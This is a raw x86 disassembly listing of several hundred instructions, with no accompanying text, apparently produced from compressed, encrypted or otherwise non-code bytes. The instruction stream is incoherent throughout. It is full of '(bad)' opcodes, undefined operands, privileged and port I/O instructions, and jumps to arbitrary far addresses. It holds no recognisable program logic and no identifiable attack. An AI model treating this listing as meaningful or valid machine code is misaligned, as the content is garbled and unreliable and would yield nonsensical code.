  51e39d:	jmp    0xa202:0xf71a602
  51e3a4:	pop    ebx
  51e3a5:	adc    bh,BYTE PTR [ebx+0x82affce]
  51e3ab:	cmp    ebp,DWORD PTR [edx+0x5d4a4c7]
  51e3b1:	fist   WORD PTR [ebx]
  51e3b3:	adc    esi,DWORD PTR [esi]
  51e3b5:	cld    
  51e3b6:	inc    ecx
  51e3b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  51e3b8:	pop    ecx
  51e3b9:	sbb    al,0xaf
  51e3bb:	pop    edx
  51e3bc:	dec    edx
  51e3bd:	cdq    
  51e3be:	mov    ecx,0x5ab00624
  51e3c3:	push   0x7b
  51e3c5:	inc    esp
  51e3c6:	mov    esp,0x3625f6a1
  51e3cb:	ins    DWORD PTR es:[edi],dx
  51e3cc:	mov    cl,0x0
  51e3ce:	dec    esi
  51e3cf:	mov    ds:0x18246c81,al
  51e3d4:	sti    
  51e3d5:	push   eax
  51e3d6:	ret    
  51e3d7:	ins    DWORD PTR es:[edi],dx
  51e3d8:	mov    dh,0x32
  51e3da:	fisttp QWORD PTR [ecx+edx*1]
  51e3dd:	sbb    BYTE PTR [ebx],0xd8
  51e3e0:	jle    0x51e437
  51e3e2:	and    al,0x3a
  51e3e4:	ror    DWORD PTR [ecx],1
  51e3e6:	dec    ecx
  51e3e7:	in     al,0x42
  51e3e9:	je     0x51e37e
  51e3eb:	outs   dx,DWORD PTR ds:[esi]
  51e3ec:	dec    edx
  51e3ed:	mov    eax,ds:0xc5dcb56b
  51e3f2:	lods   al,BYTE PTR ds:[esi]
  51e3f3:	scas   eax,DWORD PTR es:[edi]
  51e3f4:	mov    ebp,0x4699a845
  51e3f9:	call   0x4e2441e4
  51e3fe:	imul   esi
  51e400:	daa    
  51e401:	sub    esp,DWORD PTR [ecx+0x7a1880f7]
  51e407:	shr    DWORD PTR [ebp+0x44e3952b],1
  51e40d:	dec    esi
  51e40e:	into   
  51e40f:	bnd ja 0x51e420
  51e412:	xchg   esi,eax
  51e413:	daa    
  51e414:	out    dx,al
  51e415:	sub    al,BYTE PTR [ecx-0x3e99c3e]
  51e41b:	jno    0x51e3a4
  51e41d:	lods   al,BYTE PTR ds:[esi]
  51e41e:	lea    ebx,[eax+0xecafa6b]
  51e424:	mov    ecx,0xe72921aa
  51e429:	cmp    DWORD PTR [ecx+0x1829944e],0x30
  51e430:	jns    0x51e4ae
  51e432:	cmp    eax,0x216f61fa
  51e437:	inc    esi
  51e438:	into   
  51e439:	xchg   ebx,eax
  51e43a:	inc    esi
  51e43b:	data16 xor ch,bh
  51e43e:	dec    esp
  51e43f:	inc    esi
  51e440:	xor    ebp,DWORD PTR [edi+0x56]
  51e443:	sbb    DWORD PTR [ebp+0x77c13871],esi
  51e449:	and    al,0xb3
  51e44b:	push   ebp
  51e44c:	out    dx,al
  51e44d:	jmp    0x7ea32c00
  51e452:	cmc    
  51e453:	aaa    
  51e454:	fmulp  st(7),st
  51e456:	xchg   esi,eax
  51e457:	repz idiv DWORD PTR [ebx+0xa]
  51e45b:	aas    
  51e45c:	mov    al,BYTE PTR [edi-0x9]
  51e45f:	xor    BYTE PTR [ebx+eiz*1-0x51226aee],dh
  51e466:	test   edx,eax
  51e468:	es stos BYTE PTR es:[edi],al
  51e46a:	dec    edx
  51e46b:	sbb    ecx,eax
  51e46d:	mov    ebp,0x7a52914f
  51e472:	ss push eax
  51e474:	push   esi
  51e475:	mov    bx,0x90f0
  51e479:	push   eax
  51e47a:	sbb    eax,0xfc14c930
  51e47f:	in     al,0x8c
  51e481:	jo     0x51e4d5
  51e483:	out    0xb2,eax
  51e485:	mov    ebp,0xb63d47d3
  51e48a:	add    DWORD PTR [esi-0x66b1eaaf],0xae9e9ed2
  51e494:	mov    ebx,0x95c8102d
  51e499:	out    dx,eax
  51e49a:	je     0x51e4ad
  51e49c:	les    edx,FWORD PTR [edi-0x5265b6d4]
  51e4a2:	push   cs
  51e4a3:	(bad)  
  51e4a4:	fld    QWORD PTR [edx+0x7f]
  51e4a7:	iret   
  51e4a8:	cmp    BYTE PTR [edx-0x16],dl
  51e4ab:	mov    al,ds:0xd6da43b5
  51e4b0:	hlt    
  51e4b1:	aad    0xbb
  51e4b3:	ins    BYTE PTR es:[edi],dx
  51e4b4:	inc    esi
  51e4b5:	sub    eax,0x573cc8e8
  51e4ba:	mov    bl,dl
  51e4bc:	and    al,0x2b
  51e4be:	fcomp  st(2)
  51e4c0:	cld    
  51e4c1:	retf   
  51e4c2:	loopne 0x51e485
  51e4c4:	ss xchg esi,eax
  51e4c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  51e4c7:	mov    ?,WORD PTR [edi+0x6c]
  51e4ca:	jae    0x51e4ca
  51e4cc:	jmp    0xbddd:0xadf14a33
  51e4d3:	mov    ebx,0xa6e3ff71
  51e4d8:	daa    
  51e4d9:	iret   
  51e4da:	add    bl,bh
  51e4dc:	in     al,dx
  51e4dd:	mov    edi,0x937a3bad
  51e4e2:	sub    DWORD PTR [edx+0x4a4d0343],eax
  51e4e8:	and    DWORD PTR [ebx+edx*2+0x17],ecx
  51e4ec:	mov    bh,0x51
  51e4ee:	inc    eax
  51e4ef:	add    al,0x38
  51e4f1:	mov    ebp,0x10b899b3
  51e4f6:	inc    esi
  51e4f7:	imul   edx,DWORD PTR [ebp+ecx*4+0x63],0xffffffa7
  51e4fc:	inc    ecx
  51e4fd:	stc    
  51e4fe:	bound  ebx,QWORD PTR [ebp+0x2432f233]
  51e504:	mov    ebp,0x171f253f
  51e509:	push   eax
  51e50a:	jmp    0x77d2d4d7
  51e50f:	xor    BYTE PTR [edi-0x1da85f6a],bl
  51e515:	push   0x69
  51e517:	push   cs
  51e518:	mov    ds:0x76cfab33,eax
  51e51d:	enter  0xc34b,0x2c
  51e521:	xor    DWORD PTR [ebp+0x3696c50b],ecx
  51e527:	mov    bh,BYTE PTR [esi]
  51e529:	mov    ecx,0x72364232
  51e52e:	retf   0xc9fa
  51e531:	sub    bh,ch
  51e533:	sub    al,0x92
  51e535:	mov    cl,0x2c
  51e537:	sub    al,0x23
  51e539:	ja     0x51e524
  51e53b:	xlat   BYTE PTR ds:[ebx]
  51e53c:	imul   esp,DWORD PTR [eax],0x56de046f
  51e542:	pusha  
  51e543:	xor    BYTE PTR [edx-0x76],bh
  51e546:	pusha  
  51e547:	xchg   ecx,eax
  51e548:	xor    BYTE PTR [ebp-0x1307017a],dh
  51e54e:	xor    BYTE PTR [ebx],dh
  51e550:	(bad)  
  51e551:	in     eax,dx
  51e552:	fst    QWORD PTR [esi]
  51e554:	sub    eax,ecx
  51e556:	ins    DWORD PTR es:[edi],dx
  51e557:	and    DWORD PTR [edi-0x5c],0x6a
  51e55b:	mov    BYTE PTR [ecx],al
  51e55d:	jp     0x51e5d1
  51e55f:	loope  0x51e4f0
  51e561:	mov    cs,WORD PTR [ecx+0x2e377b78]
  51e567:	icebp  
  51e568:	hlt    
  51e569:	(bad)  
  51e56a:	leave  
  51e56b:	pop    esi
  51e56c:	cdq    
  51e56d:	push   esp
  51e56e:	xchg   edi,eax
  51e56f:	jmp    0xa160:0x443ff5a2
  51e576:	mov    ds:0xa3a60fff,eax
  51e57b:	hlt    
  51e57c:	mov    BYTE PTR [eax+ecx*8-0x5f],al
  51e580:	aas    
  51e581:	stc    
  51e582:	cmc    
  51e583:	mov    esi,0xc294b918
  51e588:	push   ds
  51e589:	xchg   BYTE PTR [ebx-0x8],bl
  51e58c:	jnp    0x51e58a
  51e58e:	aas    
  51e58f:	pop    eax
  51e590:	je     0x51e563
  51e592:	inc    ebx
  51e593:	fld    TBYTE PTR [ebp+0x4d]
  51e596:	xor    al,0x7d
  51e598:	mov    bh,cl
  51e59a:	mov    al,ds:0x1fb9eb22
  51e59f:	jp     0x51e5d2
  51e5a1:	popf   
  51e5a2:	lock inc BYTE PTR [edi-0x36f6a7af]
  51e5a9:	mov    DWORD PTR [eax],ebx
  51e5ab:	jmp    0xbcb1:0x65abb025
  51e5b2:	and    eax,esi
  51e5b4:	arpl   WORD PTR [ebx-0x12],bx
  51e5b7:	xlat   BYTE PTR ds:[ebx]
  51e5b8:	pop    ss
  51e5b9:	je     0x51e5ed
  51e5bb:	add    DWORD PTR [esi],esi
  51e5bd:	bound  edi,QWORD PTR [edi+0x61]
  51e5c0:	mov    bh,BYTE PTR [eax+0x2e]
  51e5c3:	xchg   BYTE PTR [edi+eax*1],ah
  51e5c6:	mov    cl,BYTE PTR [esi+edi*4-0x5a87f685]
  51e5cd:	stos   BYTE PTR es:[edi],al
  51e5ce:	push   es
  51e5cf:	xlat   BYTE PTR ds:[ebx]
  51e5d0:	sbb    DWORD PTR es:[eax],esp
  51e5d3:	pop    esi
  51e5d4:	jno    0x51e624
  51e5d6:	scas   eax,DWORD PTR es:[edi]
  51e5d7:	stos   BYTE PTR es:[edi],al
  51e5d8:	imul   eax,eax,0xaf5153a6
  51e5de:	push   esi
  51e5df:	xchg   edi,eax
  51e5e0:	mov    ch,0xae
  51e5e2:	xchg   esp,eax
  51e5e3:	pop    ebx
  51e5e4:	aam    0x59
  51e5e6:	xlat   BYTE PTR cs:[ebx]
  51e5e8:	jns    0x51e64a
  51e5ea:	retf   
  51e5eb:	mov    esi,0xc60bc9ff
  51e5f0:	inc    edx
  51e5f1:	fild   QWORD PTR [esi]
  51e5f3:	and    eax,0x8aa01fb6
  51e5f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  51e5f9:	mov    dl,BYTE PTR [ebx]
  51e5fb:	xor    BYTE PTR [esi-0x4b],bh
  51e5fe:	sbb    al,0x84
  51e600:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  51e601:	mov    cl,0x53
  51e603:	xchg   ebp,eax
  51e604:	mov    ds:0x82957e0c,eax
  51e609:	nop
  51e60a:	arpl   WORD PTR [ebx],ax
  51e60c:	sti    
  51e60d:	shl    esp,0x19
  51e610:	and    BYTE PTR [edi-0x506ed327],0xbf
  51e617:	mov    edx,0x9e7d0307
  51e61c:	loope  0x51e5f0
  51e61e:	mov    ebp,0xcd92a4c
  51e623:	out    dx,eax
  51e624:	adc    BYTE PTR [ebx],0xa9
  51e627:	repnz xor BYTE PTR [esi],ah
  51e62a:	(bad)  
  51e62b:	xchg   ebp,eax
  51e62c:	outs   dx,DWORD PTR ds:[esi]
  51e62d:	je     0x51e655
  51e62f:	ret    
  51e630:	mov    dh,0xa5
  51e632:	aaa    
  51e633:	mov    bl,0x23
  51e635:	(bad)  [eax]
  51e637:	cli    
  51e638:	ror    DWORD PTR [ebx-0x7a46e822],0x65
  51e63f:	adc    al,0xa7
  51e641:	push   ebx
  51e642:	mov    bh,0xd2
  51e644:	mov    eax,0xb7d8ad45
  51e649:	outs   dx,BYTE PTR ds:[esi]
  51e64a:	push   ebx
  51e64b:	or     al,0xad
  51e64d:	jno    0x51e5e5
  51e64f:	sbb    dl,BYTE PTR cs:[ebp+0x511c96a3]
  51e656:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  51e657:	test   ecx,0xa9b69736
  51e65d:	scas   al,BYTE PTR es:[edi]
  51e65e:	(bad)
  51e661:	xor    DWORD PTR [edx],eax
  51e663:	push   esp
  51e664:	add    al,0xcd
  51e666:	mov    al,ds:0x6e6fa8d3
  51e66b:	xor    edi,DWORD PTR [ecx]
  51e66d:	xchg   DWORD PTR [edi-0x92f1e67],ebp
  51e673:	cwde   
  51e674:	push   cs
  51e675:	jecxz  0x51e640
  51e677:	mov    bh,0x11
  51e679:	hlt    
  51e67a:	retf   0xccb8
  51e67d:	test   DWORD PTR [eax+0x5e],edx
  51e680:	xchg   DWORD PTR [edi],ebx
  51e682:	push   eax
  51e683:	je     0x51e658
  51e685:	pop    ebx
  51e686:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  51e687:	popf   
  51e688:	shr    DWORD PTR [edi+0x3d],0xcc
  51e68c:	xchg   edx,eax
  51e68d:	jle    0x51e68e
  51e68f:	add    eax,0x267710bc
  51e694:	jno    0x51e67a
  51e696:	ins    DWORD PTR es:[edi],dx
  51e697:	add    bh,BYTE PTR [ecx+0x20ba9861]
  51e69d:	mov    esi,DWORD PTR [eax]
  51e69f:	retf   0x8ce2
  51e6a2:	mov    ch,0x47
  51e6a4:	xor    eax,0xfcea51d4
  51e6a9:	stos   BYTE PTR es:[edi],al
  51e6aa:	mov    al,ds:0x6ce64cd3
  51e6af:	stc    
  51e6b0:	cmp    al,BYTE PTR [eax-0x4d]
  51e6b3:	fs daa 
  51e6b5:	outs   dx,BYTE PTR ds:[esi]
  51e6b6:	not    BYTE PTR [eax-0x523ff69e]
  51e6bc:	jp     0x51e71c
  51e6be:	xor    eax,DWORD PTR [edi-0x7c]
  51e6c1:	and    dl,BYTE PTR [eax]
  51e6c3:	iret   
  51e6c4:	pop    edx
  51e6c5:	sti    
  51e6c6:	push   ecx
  51e6c7:	push   esp
  51e6c8:	and    eax,0x37d14860
  51e6cd:	mov    ecx,0xe5da9a33
  51e6d2:	push   edi
  51e6d3:	test   ch,dl
  51e6d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  51e6d6:	sub    DWORD PTR ds:0xbbbeba18,0xffffffb5
  51e6dd:	mov    ch,0xe
  51e6df:	into   
  51e6e0:	mov    ds:0x45c2fbc0,ax
  51e6e6:	lahf   
  51e6e7:	retf   
  51e6e8:	inc    esi
  51e6e9:	inc    eax
  51e6ea:	inc    ebp
  51e6eb:	inc    esp
  51e6ec:	bnd jae 0x51e6f5
  51e6ef:	xor    eax,0x1f40c203
  51e6f4:	jbe    0x51e6bc
  51e6f6:	inc    esi
  51e6f7:	pop    ebx
  51e6f8:	imul   ebp,DWORD PTR [esi],0xffffffb1
  51e6fb:	adc    eax,0xee5fd5dc
  51e700:	ja     0x51e6b1
  51e702:	inc    esp
  51e703:	jle    0x51e69f
  51e705:	aam    0x9b
  51e707:	stc    
  51e708:	fdiv   DWORD PTR [ecx-0x1bb69689]
  51e70e:	retf   0x9ce2
  51e711:	jb     0x51e761
  51e713:	adc    BYTE PTR [ebx+ecx*1-0x6c],cl
  51e717:	lea    esi,[eax+0x16]
  51e71a:	add    ah,BYTE PTR [eax+ecx*4-0x7c51d038]
  51e721:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  51e722:	pop    ss
  51e723:	aas    
  51e724:	imul   eax,DWORD PTR gs:[edx+eiz*2+0x283fb126],0xaa92ab98
  51e730:	jp     0x51e7a8
  51e732:	jb     0x51e6f5
  51e734:	repnz xchg edx,eax
  51e736:	jmp    0xa016:0xfdc2883f
  51e73d:	pop    es
  51e73e:	inc    ecx
  51e73f:	push   esp
  51e740:	pop    edi
  51e741:	pop    esp
  51e742:	xchg   esp,eax
  51e743:	imul   esp,DWORD PTR [ecx-0x2d8910f4],0xffffffde
  51e74a:	cmp    BYTE PTR [edi+ecx*8],0xbf
  51e74e:	loop   0x51e6d5
  51e750:	inc    ebp
  51e751:	xchg   esi,eax
  51e752:	in     eax,0x51
  51e754:	in     al,0x5
  51e756:	dec    eax
  51e757:	mov    ah,0xda
  51e759:	fist   WORD PTR [esi]
  51e75b:	aam    0xc3
  51e75d:	mov    ah,BYTE PTR [ecx-0x3a]
  51e760:	mov    esp,DWORD PTR ds:0x7cb1201f
  51e766:	sahf   
  51e767:	daa    
  51e768:	out    0x5f,eax
  51e76a:	dec    esi
  51e76b:	(bad)  
  51e76d:	sbb    edi,edi
  51e76f:	cmp    bl,BYTE PTR [eax]
  51e771:	add    ebp,DWORD PTR ss:[edx]
  51e774:	call   DWORD PTR fs:[edi-0xc]
  51e778:	mov    ?,WORD PTR [eax]
  51e77a:	mov    bh,0xfd
  51e77c:	fidiv  DWORD PTR [eax]
  51e77e:	and    ch,BYTE PTR [ecx]
  51e780:	jae    0x51e715
  51e782:	cwde   
  51e783:	add    edx,edx
  51e785:	and    al,0x59
  51e787:	pop    eax
  51e788:	and    bh,BYTE PTR [edx+0xd]
  51e78b:	shr    ch,1
  51e78d:	int    0x9
  51e78f:	cmp    ebp,ebp
  51e791:	jge    0x51e765
  51e793:	or     eax,0x40abed02
  51e798:	push   ds
  51e799:	push   ebx
  51e79a:	or     esp,0x85f525ec
  51e7a0:	push   edx
  51e7a1:	aaa    
  51e7a2:	jg     0x51e76a
  51e7a4:	xor    BYTE PTR [edi+0xe],bh
  51e7a7:	xor    DWORD PTR [ebp+0x10],esp
  51e7aa:	xor    ecx,ebx
  51e7ac:	fisubr DWORD PTR [eax]
  51e7ae:	mov    edi,0x7845e82a
  51e7b3:	mov    ecx,0x52344570
  51e7b8:	dec    ebx
  51e7b9:	mov    ebp,DWORD PTR [eax+0x198ea71f]
  51e7bf:	out    0x61,eax
  51e7c1:	fbld   TBYTE PTR [esi-0x16]
  51e7c4:	loop   0x51e828
  51e7c6:	pop    ecx
  51e7c8:	mov    eax,ds:0xcbfc2e1e
  51e7cd:	out    dx,al
  51e7ce:	and    eax,0x7af1ac49
  51e7d3:	sbb    eax,eax
  51e7d5:	inc    eax
  51e7d6:	xlat   BYTE PTR ds:[ebx]
  51e7d7:	xor    ah,BYTE PTR [ecx+0xd]
  51e7da:	mov    es,WORD PTR ds:0xf4770cd6
  51e7e0:	pop    esi
  51e7e1:	leave  
  51e7e2:	ins    DWORD PTR es:[edi],dx
  51e7e3:	mov    al,ds:0x3e73963c
  51e7e8:	ss mov ebp,0x48b9fcca
  51e7ee:	out    0x17,al
  51e7f0:	stos   BYTE PTR es:[edi],al
  51e7f1:	push   ss
  51e7f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  51e7f3:	mov    eax,0xf558026
  51e7f8:	mov    esp,0x1766ef55
  51e7fd:	int3   
  51e7fe:	nop
  51e7ff:	test   DWORD PTR [ebp-0x2e],ebx
  51e802:	test   al,0xaa
  51e804:	push   ds
  51e805:	or     dl,0x2c
  51e808:	mov    bl,0xd9
  51e80a:	mov    edi,0x8cc4564
  51e80f:	add    al,0x44
  51e811:	jno    0x51e82f
  51e813:	xchg   edx,eax
  51e814:	imul   ebp,DWORD PTR [ebx],0xffffff92
  51e817:	mov    esp,edi
  51e819:	jnp    0x51e865
  51e81b:	retf   
  51e81c:	mov    al,ds:0xf92ae79a
  51e821:	leave  
  51e822:	xchg   esi,eax
  51e823:	sti    
  51e824:	lods   al,BYTE PTR ds:[esi]
  51e825:	js     0x51e85d
  51e827:	xchg   ecx,eax
  51e828:	scas   eax,DWORD PTR es:[edi]
  51e829:	repnz dec edi
  51e82b:	add    al,0x91
  51e82d:	mov    ecx,0xb8a48d3a
  51e832:	ficom  DWORD PTR [eax-0x43b9a2ab]
  51e838:	mov    eax,ds:0xd7be9efc
  51e83d:	dec    ebp
  51e83e:	dec    esp
  51e83f:	mov    edx,0xe1f80479
  51e844:	es sub eax,0x3df58251
  51e84a:	cmp    DWORD PTR [eax],0x9
  51e84d:	sub    edx,ecx
  51e84f:	scas   eax,DWORD PTR es:[edi]
  51e850:	push   ecx
  51e851:	out    0x6e,al
  51e853:	xchg   BYTE PTR [esi],ah
  51e855:	data16 vpsubw ymm4,ymm7,YMMWORD PTR ds:0xa7086fd6
  51e85e:	imul   edx,esp,0x8ff2a364
  51e864:	popa   
  51e865:	jbe    0x51e8b4
  51e867:	dec    ecx
  51e868:	neg    DWORD PTR [edi]
  51e86a:	jmp    0x8c4:0x901abcdb
  51e871:	mov    ecx,DWORD PTR [edx+0x398179cd]
  51e877:	jo     0x51e856
  51e879:	or     eax,DWORD PTR [eax-0x40]
  51e87c:	add    ecx,edx
  51e87e:	adc    DWORD PTR [eax+eax*1+0x644ad73b],ecx
  51e885:	sbb    ebp,DWORD PTR [edx]
  51e887:	or     DWORD PTR [edi*4-0x7fbcfc95],esi
  51e88e:	fist   WORD PTR [esi-0x31fee1ca]
  51e894:	call   0x33af:0x152e8fe7
  51e89b:	or     BYTE PTR [edx],cl
  51e89d:	adc    edi,0x37a1c30d
  51e8a3:	push   0x686028c6
  51e8a8:	or     ah,0x89
  51e8ab:	mov    ch,0xa
  51e8ad:	cdq    
  51e8ae:	dec    esi
  51e8af:	loope  0x51e89e
  51e8b1:	mov    esp,0xea35fe3f
  51e8b6:	in     al,dx
  51e8b7:	xchg   ebp,eax
  51e8b8:	xor    DWORD PTR [edx+0xa17e900],ebp
  51e8be:	and    DWORD PTR [eax+0x1ccf38e6],ebx
  51e8c4:	mov    WORD PTR [esi+0x40],es
  51e8c7:	loope  0x51e906
  51e8c9:	or     DWORD PTR [ebx+0x6b],ecx
  51e8cc:	pop    ecx
  51e8cd:	xor    eax,0xfc480bcd
  51e8d2:	push   0x3e
  51e8d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  51e8d5:	push   ecx
  51e8d6:	dec    edi
  51e8d7:	js     0x51e90c
  51e8d9:	mov    ebx,0x2e0625e0
  51e8de:	mov    al,BYTE PTR [esi+0x1691a523]
  51e8e4:	push   edi
  51e8e5:	push   edi
  51e8e6:	or     ecx,0x79099cb5
  51e8ec:	fsubr  DWORD PTR [ecx-0x7d15786c]
  51e8f2:	out    dx,eax
  51e8f3:	pushf  
  51e8f4:	xchg   ebp,eax
  51e8f5:	sub    edi,esp
  51e8f7:	or     DWORD PTR [edi],0xffffff86
  51e8fa:	idiv   BYTE PTR [esi-0x7e]
  51e8fd:	push   esi
  51e8fe:	sti    
  51e8ff:	sbb    eax,0x33bb7a24
  51e904:	sub    DWORD PTR [esi-0x5a],0xc32d123c
  51e90b:	or     bl,cl
  51e90d:	cmp    esi,DWORD PTR [ebp+0x13c243de]
  51e913:	iret   
  51e914:	dec    ebx
  51e915:	xchg   BYTE PTR [esi+edi*8],ch
  51e918:	pop    es
  51e919:	aaa    
  51e91a:	loopne 0x51e985
  51e91c:	jl     0x51e8bf
  51e91e:	adc    BYTE PTR [edi+edi*4+0x7fedbf1d],al
  51e925:	repz gs jmp 0xa4591831
  51e92c:	xchg   DWORD PTR [eax+0xd],eax
  51e92f:	add    ch,cl
  51e931:	loop   0x51e8d1
  51e933:	jb     0x51e971
  51e935:	jne    0x51e8ed
  51e937:	(bad)  
  51e938:	mov    ecx,DWORD PTR [ecx]
  51e93a:	pop    edi
  51e93b:	test   bh,0x67
  51e93e:	mov    ch,0x4b
  51e940:	neg    DWORD PTR [esp+eax*2+0x3156c63f]
  51e947:	xchg   DWORD PTR [ebp+0x2b],ebp
  51e94a:	retf   
  51e94b:	gs icebp 
  51e94d:	shl    bh,1
  51e94f:	sbb    ah,BYTE PTR [esi+0x62]
  51e952:	cmp    eax,0xafd2ba63
  51e957:	sub    DWORD PTR [edx+0x27bfdd7b],esi
  51e95d:	xchg   esp,eax
  51e95e:	popa   
  51e95f:	or     DWORD PTR [eax+0x62],ebx
  51e962:	retf   
  51e963:	(bad)  
  51e964:	inc    ebp
  51e965:	mov    ?,WORD PTR [edx-0x2dbce285]
  51e96b:	cmp    DWORD PTR [ecx-0x72],edi
  51e96e:	icebp  
  51e96f:	imul   ecx,eax,0xab8181f0
  51e975:	outs   dx,DWORD PTR ds:[esi]
  51e976:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  51e977:	jmp    0x51e964
  51e979:	xor    esp,DWORD PTR [ecx+0x6c]
  51e97c:	inc    edi
  51e97d:	mov    eax,ds:0x1db7a7d7
  51e982:	fs jno 0x51e94d
  51e985:	jns    0x51ea02
  51e987:	inc    esp
  51e988:	pop    ds
  51e989:	gs (bad) 
  51e98b:	mov    al,BYTE PTR ds:0x9ffa0cc5
  51e991:	xchg   DWORD PTR [ecx],eax
  51e993:	sbb    esi,eax
  51e995:	or     BYTE PTR [eax-0x2062e68],bl
  51e99b:	test   eax,esp
  51e99d:	les    ecx,FWORD PTR [ebp-0x3c]
  51e9a0:	icebp  
  51e9a1:	(bad)  
  51e9a2:	data16 aaa 
  51e9a4:	test   BYTE PTR [ebx+0x4b],al
  51e9a7:	push   edi
  51e9a8:	and    edi,DWORD PTR [eax]
  51e9aa:	lds    edi,FWORD PTR [esi+0x6f]
  51e9ad:	nop
  51e9ae:	sbb    al,0x11
  51e9b0:	fiadd  WORD PTR [eax]
  51e9b2:	and    DWORD PTR [edi-0x276c4ccc],0x4a
  51e9b9:	push   eax
  51e9ba:	push   ds
  51e9bb:	(bad)  
  51e9bc:	push   0xe756da80
  51e9c1:	pop    ecx
  51e9c2:	dec    edx
  51e9c3:	fdivrp st(3),st
  51e9c5:	jmp    0x443f:0xa670089b
  51e9cc:	retf   
  51e9cd:	es xchg edi,eax
  51e9cf:	add    DWORD PTR [edx],ecx
  51e9d1:	fadd   DWORD PTR [esi-0x8]
  51e9d4:	jmp    0x51e9f4
  51e9d6:	ins    BYTE PTR es:[edi],dx
  51e9d7:	push   ds
  51e9d8:	inc    edi
  51e9d9:	sar    DWORD PTR [edi-0xf3d5d02],cl
  51e9df:	xor    al,0x70
  51e9e1:	xor    edx,DWORD PTR [eax+0x2691693b]
  51e9e7:	fwait
  51e9e8:	out    0x54,eax
  51e9ea:	dec    edx
  51e9eb:	(bad)  
  51e9ec:	test   DWORD PTR [ecx+0x47],ebx
  51e9ef:	in     al,dx
  51e9f0:	in     eax,0x29
  51e9f2:	or     ch,dl
  51e9f4:	scas   eax,DWORD PTR es:[edi]
  51e9f5:	in     eax,0x17
  51e9f7:	dec    ebx
  51e9f8:	lahf   
  51e9f9:	mov    ebx,0x9ccdc811
  51e9fe:	push   ebp
  51e9ff:	test   al,0xa3
  51ea01:	jl     0x51ea65
  51ea03:	pop    esi
  51ea04:	inc    edx
  51ea05:	ret    
  51ea06:	dec    edi
  51ea07:	sub    BYTE PTR [edi-0x62cf774d],dl
  51ea0d:	ficomp DWORD PTR ds:0xd41ce02b
  51ea13:	xchg   BYTE PTR [edx],bl
  51ea15:	mov    ch,0x87
  51ea17:	push   edi
  51ea18:	sub    ebp,edi
  51ea1a:	ss in  eax,dx
  51ea1c:	jno    0x51e9a7
  51ea1e:	adc    DWORD PTR [ecx],esp
  51ea20:	cmovne esi,esi
  51ea23:	setns  BYTE PTR [edx+0x3573951a]
  51ea2a:	call   0x9845:0x999d3e67
  51ea31:	xor    eax,0xf929120a
  51ea36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  51ea37:	(bad)  
  51ea38:	jle    0x51ea9c
  51ea3a:	and    eax,DWORD PTR [esi-0x38eae53b]
  51ea40:	fxch   st(4)
  51ea42:	(bad)  
  51ea43:	push   ebx
  51ea44:	outs   dx,DWORD PTR ds:[esi]
  51ea45:	jns    0x51ea20
  51ea47:	sti    
  51ea48:	dec    ebx
  51ea49:	mov    dl,bl
  51ea4b:	and    eax,0x821bd31a
  51ea50:	mov    eax,ds:0x985b3563
  51ea55:	jge    0x51ea30
  51ea57:	out    0x61,al
  51ea59:	inc    edi
  51ea5a:	adc    DWORD PTR [edi],eax
  51ea5c:	jg     0x51ea27
  51ea5e:	push   eax
  51ea5f:	sub    bh,dl
  51ea61:	ins    BYTE PTR es:[edi],dx
  51ea62:	pop    ds
  51ea63:	aas    
  51ea64:	cli    
  51ea65:	test   eax,0x7b4e381b
  51ea6a:	add    al,0xbe
  51ea6c:	push   eax
  51ea6d:	outs   dx,DWORD PTR ds:[esi]
  51ea6e:	add    eax,DWORD PTR [edi]
  51ea70:	sbb    eax,0x5bcd95b9
  51ea75:	add    eax,0xb44d2d32
  51ea7a:	mov    edi,0xe00ba4aa
  51ea7f:	push   ebp
  51ea80:	jno    0x51ead9
  51ea82:	aas    
  51ea83:	cli    
  51ea84:	mov    ah,0x4a
  51ea86:	div    bl
  51ea88:	shld   edx,edi,cl
  51ea8b:	pop    ecx
  51ea8c:	outs   dx,DWORD PTR ds:[esi]
  51ea8d:	jne    0x51ea2e
  51ea8f:	fdecstp 
  51ea91:	push   ds
  51ea92:	xchg   esi,eax
  51ea93:	fmul   st,st(7)
  51ea95:	arpl   WORD PTR [ecx+0x25],cx
  51ea98:	jp     0x51eac1
  51ea9a:	add    edi,DWORD PTR [edx-0x6a9245c1]
  51eaa0:	cmp    cl,bl
  51eaa2:	lods   eax,DWORD PTR ds:[si]
  51eaa4:	jle    0x51ea3c
  51eaa6:	ins    DWORD PTR es:[edi],dx
  51eaa7:	cmp    BYTE PTR [esp+ecx*4],0x8e
  51eaab:	aad    0x8b
  51eaad:	shl    DWORD PTR [edi-0x609cd22e],cl
  51eab3:	and    ah,dh
  51eab5:	jns    0x51eb01
  51eab7:	pushf  
  51eab8:	mov    ds:0x4d0f5ddd,eax
  51eabd:	arpl   WORD PTR ds:0x1f7d9aab,di
  51eac3:	xlat   BYTE PTR ds:[ebx]
  51eac4:	mov    DWORD PTR [edi-0x6619d4f4],edi
  51eaca:	es repnz out dx,eax
  51eacd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  51eace:	pop    ss
  51eacf:	mov    cl,BYTE PTR ds:0xc303543e
  51ead5:	pop    ecx
  51ead6:	test   DWORD PTR [edx-0x21],esi
  51ead9:	cwde   
  51eada:	scas   al,BYTE PTR es:[edi]
  51eadb:	lahf   
  51eadc:	inc    BYTE PTR [esi+edi*1]
  51eadf:	xchg   edi,eax
  51eae0:	or     BYTE PTR [eax+0x27],dh
  51eae3:	shr    DWORD PTR [ebx+esi*1],1
  51eae6:	mov    al,BYTE PTR [ebx+edx*8]
  51eae9:	push   ebp
  51eaea:	mov    BYTE PTR [edx],bl
  51eaec:	jge    0x51ea87
  51eaee:	pop    ebp
  51eaef:	adc    edx,DWORD PTR [ebx]
  51eaf1:	rcl    BYTE PTR [ebp+edx*4-0x21],0x48
  51eaf6:	call   0x5a801d72
  51eafb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  51eafc:	push   eax
